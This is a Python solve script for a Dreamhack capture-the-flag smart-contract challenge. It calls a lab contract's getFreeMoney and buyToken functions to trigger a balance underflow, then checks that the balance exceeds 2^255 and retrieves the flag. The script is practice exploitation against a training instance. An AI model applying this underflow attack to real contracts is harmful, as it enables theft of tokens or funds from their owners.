from web3 import Web3
import os
import re
import subprocess
import requests
import json

# 문제에서 사용하는 각종 정보 추출
MAIN_URL = "http://host3.dreamhack.games:9353"

START_URL = f"{MAIN_URL}/start"

resp = requests.get(START_URL)

JSON_OBJECT = json.loads(resp.text)

TOKEN_URL = JSON_OBJECT['message'].split('/')[1]
INFO_URL = f"{MAIN_URL}/{TOKEN_URL}/info"
FLAG_URL = f"{MAIN_URL}/{TOKEN_URL}/flag"
RPC_URL = f"{MAIN_URL}/{TOKEN_URL}/rpc"

print(f"INFO URL : {INFO_URL}")
print(f"FLAG URL : {FLAG_URL}")
print(f"RPC URL : {RPC_URL}")

resp = requests.get(INFO_URL)

JSON_OBJECT = json.loads(resp.text)

CONTRACT_ADDRESS = JSON_OBJECT["message"]["level_contract_address"]
USER_PRIV_KEY = JSON_OBJECT["message"]["user_private_key"]
USER_ADDRESS = JSON_OBJECT["message"]["user_address"]

print(f"Contract Address : {CONTRACT_ADDRESS}")
print(f"User private key : {USER_PRIV_KEY}")
print(f"User address : {USER_ADDRESS}")

CONTRACT_ABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "balance",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "string",
                "name": "tokenName",
                "type": "string"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "buyToken",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getFreeMoney",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "hasReceivedFreeMoney",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            },
            {
                "internalType": "string",
                "name": "",
                "type": "string"
            }
        ],
        "name": "inventory",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "string",
                "name": "",
                "type": "string"
            }
        ],
        "name": "tokenCost",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
]

ATTACKER_ABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_target",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs":[],
        "name":"solve",
        "outputs":[],
        "stateMutability":"nonpayable",
        "type":"function"
    }
]

web3 = Web3(Web3.HTTPProvider(RPC_URL))
'''
current_file = os.path.abspath(__file__)

BASE_DIR = os.path.dirname(current_file) + "/sc-dreamhack-token-shop"
CONTRACT_PATH = "/src/Contract.sol"

command = [
    "forge", "create",
    "--rpc-url", RPC_URL,
    "--private-key", USER_PRIV_KEY,
    BASE_DIR + CONTRACT_PATH + ":Contract",
    "--via-ir",
    "--broadcast",
    "--constructor-args",
    CONTRACT_ADDRESS
]

try:
    result = subprocess.run(command, check=True, text=True, capture_output=True)
    print("CONTRACT DEPLOY SUCCESS!")
    
    attacker_address_match = re.search(r"Deployed to: (0x[a-fA-F0-9]{40})", result.stdout)

    ATTACKER_ADDRESS = attacker_address_match.group(1) if attacker_address_match else "Not found..."
    
except subprocess.CalledProcessError as e:
    print("CONTRACT DEPLOY FAILED...")
    print(e.stderr)

if (ATTACKER_ADDRESS == "Not found..."):
    print("ATTACKER ADDRESS NOT FOUND...")
    exit(0)

attacker = web3.eth.contract(abi=ATTACKER_ABI, address=ATTACKER_ADDRESS)
'''
contract = web3.eth.contract(abi=CONTRACT_ABI, address=CONTRACT_ADDRESS)

print("---- DO ATTACK ----")

tokenName = "boko"
tokenAmount = 10

tx = contract.functions.getFreeMoney().build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

tx = contract.functions.buyToken(tokenName, tokenAmount).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.0000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

after_balance = contract.functions.balance(USER_ADDRESS).call()

problem_check = after_balance >= 0x8000000000000000000000000000000000000000000000000000000000000000 if True else False

print(f"User Balance:{hex(after_balance)}")
print(f"is cleared? {problem_check}")

print("---- GET FLAG ----")
resp = requests.get(FLAG_URL)

print(resp.text)